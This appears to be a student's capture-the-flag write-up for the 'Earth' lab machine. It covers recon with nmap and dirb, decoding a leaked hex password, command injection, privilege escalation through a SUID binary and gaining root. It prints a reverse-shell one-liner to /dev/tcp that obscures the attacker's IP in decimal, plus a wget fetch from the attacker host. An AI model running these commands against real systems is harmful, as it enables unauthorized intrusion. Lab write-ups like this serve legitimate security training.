# The Planets: Earth 192.168.56.103
## Andrea Zonnekus 18758119

Start the process

sudo netdiscover -i eth0 -P > hosts &

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.001.png)

sudo nmap –vv -F -sV –version-light -O –osscan-limit 192.168.56.105 -oN initial\_scan

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.002.png)

dirb http://192.168.56.103:80 > dirb\_80

Doesn’t give much

Open services in web browser

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.003.png)

Seems to have an issue on the certificate

sudo openssl s\_client -connect 192.168.56.103:443 </dev/null 2>/dev/null | openssl x509 -inform pem -text | grep Name -A 1

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.004.png)

Add this

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.005.png)



Navigate and check it tout

dirb <http://earth.local/>

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.006.png)

Go to admin, look around, there is a CSRF Token

dirb <https://terratest.earth.local/>

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.007.png)

Something interesting

sudo wget https://terratest.earth.local/robots.txt --no-check-certificate

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.008.png)

Not shown is the testing notes – probably txt

sudo wget https://terratest.earth.local/testingnotes.txt --no-check-certificate

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.009.png)

And bingo was his name-o

Use xxd and website to decrypt 

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.010.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.011.png)

sudo xxd -r -p hex\_decode.txt

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.012.png)”earthclimatechangebad4humans” is the only thing here that makes sense

Get some system information

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.013.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.014.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.015.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.016.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.017.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.018.png)

We have some OS information, x64 Fedora 34, Kernel 5

cd /tmp; ls -al; touch tet.txt; ls

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.019.png)



Test if we can grab files

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.020.png)

cd /tmp; ls -al; wget http://192.168.56.102/test.txt; ls

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.021.png)

cd /tmp; ls; bash -i >& /dev/tcp/3232249958/666 0>&1; ls

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.022.png)

Typing bash then works

cd ~ then ls -lR

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.023.png)

Look around

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.024.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.025.png)

Totally forgot to spawn a shell

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.026.png)

find / -perm -4000 2>/dev/null

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.027.png)

cat /usr/bin/reset\_root

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.028.png)

Let’s just ltrace it

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.029.png)

Okay, on our machine then

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.030.png)

Make the files

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.031.png)

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.032.png)

Am root

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.033.png)

Yay

![](earth_steps/Aspose.Words.0b81a9db-0dc5-4a82-b2f4-060c5afe8b04.034.png)
